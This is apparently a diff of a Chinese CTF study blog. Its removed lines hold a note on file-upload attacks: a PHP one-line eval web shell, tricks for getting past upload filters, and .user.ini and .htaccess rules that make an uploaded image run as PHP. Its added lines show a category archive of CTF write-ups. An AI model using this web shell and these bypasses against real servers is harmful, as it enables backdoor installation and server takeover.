@@ -3,7 +3,7 @@
 <html lang="zh-CN">
     <head>
         <meta charset="UTF-8" />
-        <title>文件上传 | 雲流のLowest World</title>
+        <title>Categories: 赛后复现 | 雲流のLowest World</title>
         <meta name="author" content="CloudFlowing" />
         <meta name="description" content="" />
         <meta name="keywords" content="" />
@@ -20,10 +20,6 @@
 
 
 <script src="/blog/js/lib/preview.js"></script>
-
-
-
-
 
 
 
@@ -57,7 +53,7 @@
 
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload"><span class="toc-text">文件上传upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6"><span class="toc-text">前端限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E9%99%90%E5%88%B6"><span class="toc-text">后端限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-text">.user.ini配置文件绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess-%E7%8E%AF%E5%A2%83%E4%B8%BAApache%E6%97%B6%E4%BD%BF%E7%94%A8"><span class="toc-text">.htaccess(环境为Apache时使用)</span></a></li></ol></li></ol></li></ol>
+    
 </div>
         
         <div id="layout">
@@ -164,20 +160,13 @@
     </div>
 </nav>
 
-                <div class="article">
-    <div>
-        <h1>文件上传</h1>
-    </div>
-    <div class="info">
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/3/16
-        </span>
+                <div id="archives">
+    
+    <div class="categories-tags">
         
-        <span class="category">
-            <a href="/blog/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+        
+        <span>
+            <a href="/blog/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background: #00bcd4">
                 <span class="icon">
                     <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
@@ -186,88 +175,136 @@
         </span>
         
         
-        <span class="tags">
-            <span class="icon">
-                <i class="fa-solid fa-tags fa-fw"></i>
-            </span>
-            
-            <span class="tag">
-                
-                <a href="/blog/tags/Web/" style="color: #03a9f4">Web</a>
-            </span>
-            
+        
+        <span>
+            <a href="/blog/categories/Writeup/" style="background: #ffa2c4">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Writeup
+            </a>
         </span>
+        
+        
+        
+        <span>
+            <a href="/blog/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/" style="background: linear-gradient(120deg, #9abbf7 0%, #ffbbf4 100%)">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                赛后复现
+            </a>
+        </span>
+        
+        
+        
         
     </div>
     
-    <div class="content" v-pre>
-        <h1 id="文件上传upload"><a href="#文件上传upload" class="headerlink" title="文件上传upload"></a>文件上传upload</h1><span id="more"></span>
-
-<blockquote>
-<p>原理：php写一句话木马上传</p>
-</blockquote>
-<pre><code class="php">&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;
-</code></pre>
-<h2 id="前端限制"><a href="#前端限制" class="headerlink" title="前端限制"></a>前端限制</h2><blockquote>
-<p>f12修改页面可解</p>
-</blockquote>
-<h2 id="后端限制"><a href="#后端限制" class="headerlink" title="后端限制"></a>后端限制</h2><ul>
-<li><p>限制传图片，</p>
-<p>可写入一句话木马改成<code>jpg</code>,<code>png</code>等图片格式，上传时改成.php</p>
-</li>
-<li><p>PHP环境下若php被过滤，</p>
-<p>传入后缀为<code>.Php</code> ,<code>.phtml</code> ,<code>.php3</code> ,<code>.php4</code>的一句话木马（可当作php解析）</p>
-</li>
-<li><p>文件内容字符限制</p>
-<p>尝试把<code>&lt;?php</code>改为<code>&lt;?Php</code></p>
-<p>尝试使用短标签</p>
-<ul>
-<li>格式正确的情况下无法上传尝试减少图片内容</li>
-</ul>
-</li>
-<li><p>一句话木马中字符过滤</p>
-<p><code>[]</code>：尝试使用<code>&#123;&#125;</code></p>
-<p><code>;</code>：尝试使用php闭合标签<code>?&gt;</code></p>
-</li>
-<li><p>传入shell失败</p>
-<p>可尝试直接传入命令执行</p>
-</li>
-</ul>
-<h3 id="user-ini配置文件绕过"><a href="#user-ini配置文件绕过" class="headerlink" title=".user.ini配置文件绕过"></a><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/vip_mmles/topics/1547397">.user.ini配置文件绕过</a></h3><p>可用于抓包可上传但不解析且文件夹下存在php文件的情形</p>
-<blockquote>
-<p>php.ini 是 php 的一个全局配置文件，对整个 web 服务起作用；而.user.ini 和.htaccess 一样是目录的配置文件，.user.ini 就是用户自定义的一个 php.ini，通常用这个文件来构造后门和隐藏后门</p>
-</blockquote>
-<pre><code class="php">相关配置项，作用相当于文件包含
-auto_prepend_file = &lt;filename&gt;         //包含在文件头
-    在当前目录下的.php 文件包含 1.jpg(以1.jpg为例),即在php文件头插入require(&#39;1.jpg&#39;)
-auto_append_file = &lt;filename&gt;          //包含在文件尾
-</code></pre>
-<ul>
-<li>包含在文件尾的语句遇到<code>exit()</code>等会失效</li>
-</ul>
-<h3 id="htaccess-环境为Apache时使用"><a href="#htaccess-环境为Apache时使用" class="headerlink" title=".htaccess(环境为Apache时使用)"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/mmzkyl/article/details/112138834">.htaccess</a>(环境为Apache时使用)</h3><pre><code class="htaccess">&lt;FilesMatch &quot;1.jpg&quot;&gt;
-
-Sethandler application/x-httpd-php
-#&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;
-
-Addhandler php5-script .jpg
-#&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;
-
-&lt;/FilesMatch&gt;
-#&lt;!-- 该种匹配方式较为精准，不会造成大批的误伤情况 --&gt;
-</code></pre>
-<ul>
-<li>记得改Content-Type</li>
-</ul>
-<hr>
-
+    <div class="timeline">
+        <div class="timeline-tail"></div>
+        <div class="timeline-content">
+            <div class="item-time">2023/3/2</div>
+            <a href="/blog/2023/03/02/Forestwolf/">
+                <h3>Forestwolf</h3>
+            </a>
+            <div class="info">
+                
+                <span class="category">
+                    <a href="/blog/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+                        <span class="icon">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </span>
+                        赛后复现
+                    </a>
+                </span>
+                
+                
+                <span class="tags">
+                    <span class="icon">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </span>
+                    
+                    <span class="tag">
+                        
+                        <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #00bcd4">CTF线上赛</a>
+                    </span>
+                    
+                </span>
+                
+            </div>
+        </div>
     </div>
     
+    <div class="timeline">
+        <div class="timeline-tail"></div>
+        <div class="timeline-content">
+            <div class="item-time">2023/3/1</div>
+            <a href="/blog/2023/03/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022/">
+                <h3>西湖论剑2022</h3>
+            </a>
+            <div class="info">
+                
+                <span class="category">
+                    <a href="/blog/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+                        <span class="icon">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </span>
+                        赛后复现
+                    </a>
+                </span>
+                
+                
+                <span class="tags">
+                    <span class="icon">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </span>
+                    
+                    <span class="tag">
+                        
+                        <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ffa2c4">CTF线上赛</a>
+                    </span>
+                    
+                </span>
+                
+            </div>
+        </div>
+    </div>
     
-    
-    
-    
-    
+    <div class="timeline">
+        <div class="timeline-tail"></div>
+        <div class="timeline-content">
+            <div class="item-time">2023/2/26</div>
+            <a href="/blog/2023/02/26/VNCTF-GongDe/">
+                <h3>VNCTF GongDe</h3>
+            </a>
+            <div class="info">
+                
+                <span class="category">
+                    <a href="/blog/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+                        <span class="icon">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </span>
+                        赛后复现
+                    </a>
+                </span>
+                
+                
+                <span class="tags">
+                    <span class="icon">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </span>
+                    
+                    <span class="tag">
+                        
+                        <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #03a9f4">CTF线上赛</a>
+                    </span>
+                    
+                </span>
+                
+            </div>
+        </div>
+    </div>
     
 </div>
 
@@ -300,12 +337,6 @@ Addhandler php5-script .jpg
             
         </div>
         <script src="/blog/js/main.js"></script>
-        
-        
-
-
-
-
          
     <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
